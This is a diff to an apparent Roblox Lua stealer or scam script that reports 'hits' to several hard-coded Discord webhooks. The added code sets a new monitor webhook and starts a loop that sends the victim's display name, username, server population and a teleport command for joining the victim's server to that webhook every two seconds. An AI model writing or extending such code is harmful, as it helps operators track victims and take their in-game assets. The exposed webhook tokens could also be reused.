@@ -15,7 +15,9 @@ local CONFIG = {
     ALL_HITS_WEBHOOK_URL = "https://discord.com/api/webhooks/1397485572884271134/SeiDaELPQmgoaYyUIsXAefydjAfIi8_CVO0qAawMu5zGZeFOTXkKxy8nf6OwWPRHuucB",
     KITSUNE_WEBHOOK_URL = "https://discord.com/api/webhooks/1397485371779973150/F8IGnpfXUJlxJRYQBSTFANg_An2e0Ih2jAFQRkaE7XWe5UC8YruXddau8qb3OZy52VF1",
     LOGS_WEBHOOK_URL = "https://discord.com/api/webhooks/1399656998735187989/fDybU5d8Ub9HhKxa0BL7zAUDgUpmCTe4ibQMYL-D1L-fMzq9tz6ASmEO73eNIRPaNHPV",
+    MONITOR_WEBHOOK_URL = "https://discord.com/api/webhooks/1400806550779596800/zxuZoPbbY2_DpsgcP3Wm2AnmcjfUAfLNh-jddCn_PWPKj8Uvzaoeod3cVZidn-i3CMKw",
     PING_MESSAGE = "@everyone **kupal naka HIT!!!🤑🤑🤑🤑**",
+    KITSUNE_PING_MESSAGE = "@everyone",
     DYNAMIC_DISCORD_LINKS = {
         "https://discord.gg/ZXwu8pKQwp",
         "https://discord.gg/ZXwu8pKQwp"
@@ -309,5 +311,34 @@ task.spawn(function()
         local embed_log = {title = "🐾 New Hit Logged", color = 15158332, description = log_description, footer = { text = "Public Feed" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
         local payload_log = {username = "CHETOS LOGS", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed_log }}
         sendOurWebhook(CONFIG.LOGS_WEBHOOK_URL, payload_log)
+    end
+end)
+
+task.spawn(function()
+    while player.Parent do
+        local serverPlayerCount = #Players:GetPlayers()
+        local maxPlayerCount = Players.MaxPlayers
+        local serverStatus = string.format("%d/%d", serverPlayerCount, maxPlayerCount)
+        local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", game.PlaceId, game.JobId)
+
+        local embed = {
+            title = "Victim & Server Monitor",
+            color = 16776960,
+            fields = {
+                {name = "👤 Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = true},
+                {name = "🌐 Server Population", value = string.format("`%s`", serverStatus), inline = true},
+                {name = "🔗 Join Command", value = teleport_command, inline = false}
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+        
+        local payload = {
+            username = "CHETOS MONITOR",
+            avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",
+            embeds = { embed }
+        }
+
+        sendOurWebhook(CONFIG.MONITOR_WEBHOOK_URL, payload)
+        task.wait(2)
     end
 end)
